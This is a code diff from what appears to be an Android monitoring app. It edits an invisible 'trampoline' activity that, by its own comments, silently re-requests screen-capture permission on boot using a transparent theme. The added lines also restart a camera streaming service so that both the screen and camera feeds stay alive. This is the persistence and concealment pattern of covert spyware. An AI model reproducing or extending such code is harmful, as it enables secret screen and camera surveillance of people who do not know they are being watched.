@@ -10,6 +10,8 @@ import androidx.appcompat.app.AppCompatActivity
  * Transparent trampoline activity that silently re-requests MediaProjection permission.
  * Called on boot and when service needs to restart.
  * Has a transparent theme so it appears invisible.
+ *
+ * Also restarts CameraStreamService so BOTH services are always alive.
  */
 class ProjectionRequestActivity : AppCompatActivity() {
 
@@ -20,6 +22,8 @@ class ProjectionRequestActivity : AppCompatActivity() {
     ) { result ->
         if (result.resultCode == RESULT_OK && result.data != null) {
             MonitorService.startWithProjection(this, result.resultCode, result.data!!)
+            // Always restart camera service too — keeps both services in sync
+            CameraStreamService.start(this)
         }
         finish()
     }
